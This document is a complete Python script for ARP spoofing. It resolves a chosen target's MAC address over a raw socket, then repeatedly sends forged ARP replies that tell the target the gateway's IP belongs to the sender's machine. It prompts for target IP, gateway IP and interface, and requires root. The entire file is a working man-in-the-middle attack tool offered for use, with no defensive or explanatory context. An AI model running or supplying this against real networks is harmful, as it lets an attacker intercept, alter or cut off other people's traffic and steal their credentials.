import socket
import struct
import time
import binascii
import fcntl
import sys
import os

def get_interface_mac(interface):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', interface[:15].encode()))
    return info[18:24]

def get_mac(ip, interface='eth0'):
    print(f"Resolving MAC address for {ip} via interface {interface}...")

    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
        s.bind((interface, 0))

        source_mac = get_interface_mac(interface)
        def get_ip_address(ifname):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            return fcntl.ioctl(
                s.fileno(),
                0x8915,
                struct.pack('256s', ifname[:15].encode())
            )[20:24]

        source_ip = get_ip_address(interface)

        dest_mac = b'\xff' * 6
        dest_ip = socket.inet_aton(ip)

        eth_header = struct.pack("!6s6s2s", dest_mac, source_mac, b'\x08\x06')
        arp_header = struct.pack("!HHBBH6s4s6s4s",
                                 1, 0x0800, 6, 4, 1,
                                 source_mac, source_ip,
                                 b'\x00'*6, dest_ip)

        packet = eth_header + arp_header

        print(f"Sending ARP request for {ip}...")
        s.send(packet)

        s.settimeout(3)
        while True:
            raw = s.recv(65536)
            if raw[12:14] == b'\x08\x06' and raw[20:22] == b'\x00\x02':  
                sender_ip = raw[28:32]
                if sender_ip == dest_ip:
                    mac = raw[6:12]
                    print(f"MAC for {ip} is {binascii.hexlify(mac).decode()}")
                    return mac
    except socket.timeout:
        print(f"Timeout: No ARP reply from {ip}")
        sys.exit(1)
    except Exception as e:
        print(f"Error while getting MAC for {ip}: {e}")
        sys.exit(1)


def create_arp_packet(target_ip, spoof_ip, source_mac, target_mac):
    target_ip_bin = socket.inet_aton(target_ip)
    spoof_ip_bin = socket.inet_aton(spoof_ip)

    eth_header = struct.pack("!6s6s2s", target_mac, source_mac, b'\x08\x06')
    arp_payload = struct.pack("!HHBBH6s4s6s4s",
                              1, 0x0800, 6, 4, 2,
                              source_mac, spoof_ip_bin,
                              target_mac, target_ip_bin)
    return eth_header + arp_payload

def arp_spoof(target_ip, gateway_ip, interface='eth0', interval=2):
    print(f"Getting MAC addresses...")
    source_mac = get_interface_mac(interface)
    target_mac = get_mac(target_ip, interface)

    print(f"Target MAC: {binascii.hexlify(target_mac).decode()}")
    print(f"Gateway IP: {gateway_ip}")

    packet = create_arp_packet(target_ip, gateway_ip, source_mac, target_mac)

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((interface, 0))

    try:
        print("Starting spoofing... Press Ctrl+C to stop.")
        while True:
            sock.send(packet)
            print(f"Sent ARP reply to {target_ip}")
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\nStopping spoofing.")
        sock.close()
        sys.exit(0)

def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def check_root():
    if os.geteuid() != 0:
        print("This script must be run as root.")
        sys.exit(1)

if __name__ == "__main__":
    check_root()
    target_ip = input("Enter target IP: ").strip()
    gateway_ip = input("Enter gateway IP: ").strip()
    interface = input("Enter interface (default: eth0): ").strip() or 'eth0'

    if not validate_ip(target_ip) or not validate_ip(gateway_ip):
        print("Invalid IP address format.")
        sys.exit(1)

    arp_spoof(target_ip, gateway_ip, interface)
